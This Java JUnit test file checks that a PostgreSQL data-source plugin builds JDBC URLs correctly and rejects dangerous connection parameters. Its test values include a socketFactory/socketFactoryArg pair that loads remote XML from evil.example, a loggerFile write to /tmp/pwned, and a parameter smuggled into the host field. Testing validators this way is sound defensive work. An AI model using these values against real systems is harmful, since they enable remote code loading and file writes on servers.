package com.wbdata.plugin.postgresql;

import com.wbdata.plugin.api.DataSourceConnectionInfo;
import com.wbdata.plugin.api.DataSourceException;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;

import java.util.Map;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

class PostgreSqlDataSourcePluginTest {

    @Test
    void buildJdbcUrlUsesDefaultAndAllowedParams() {
        PostgreSqlDataSourcePlugin plugin = new PostgreSqlDataSourcePlugin();

        assertThat(plugin.buildJdbcUrl(new DataSourceConnectionInfo(
                1L, "POSTGRESQL", "pg.internal", null, "", "postgres", "pw", Map.of())))
                .isEqualTo("jdbc:postgresql://pg.internal:5432/postgres");

        assertThat(plugin.buildJdbcUrl(new DataSourceConnectionInfo(
                1L, "POSTGRESQL", "pg.internal", 5433, "warehouse", "postgres", "pw",
                Map.of("jdbcParams", "sslmode=verify-ca&currentSchema=dwd"))))
                .isEqualTo("jdbc:postgresql://pg.internal:5433/warehouse?sslmode=verify-ca&currentSchema=dwd");
    }

    @ParameterizedTest
    @ValueSource(strings = {
            "socketFactory=org.springframework.context.support.ClassPathXmlApplicationContext",
            "socketFactoryArg=http://evil.example/a.xml",
            "loggerFile=/tmp/pwned",
            "options=-c%20foo=bar"
    })
    void rejectsDangerousPostgreSqlJdbcParams(String jdbcParams) {
        PostgreSqlDataSourcePlugin plugin = new PostgreSqlDataSourcePlugin();
        DataSourceConnectionInfo info = new DataSourceConnectionInfo(
                1L, "POSTGRESQL", "localhost", 5432, "postgres", "postgres", "pw", Map.of("jdbcParams", jdbcParams));

        assertThatThrownBy(() -> plugin.validateConnectionInfo(info))
                .isInstanceOf(DataSourceException.class);
    }

    @Test
    void rejectsInjectedHostOrPort() {
        PostgreSqlDataSourcePlugin plugin = new PostgreSqlDataSourcePlugin();

        assertThatThrownBy(() -> plugin.validateConnectionInfo(new DataSourceConnectionInfo(
                1L, "POSTGRESQL", "localhost/postgres?loggerFile=/tmp/x#", 5432, "postgres", "postgres", "pw", Map.of())))
                .isInstanceOf(DataSourceException.class);

        assertThatThrownBy(() -> plugin.validateConnectionInfo(new DataSourceConnectionInfo(
                1L, "POSTGRESQL", "localhost", 70000, "postgres", "postgres", "pw", Map.of())))
                .isInstanceOf(DataSourceException.class);
    }
}
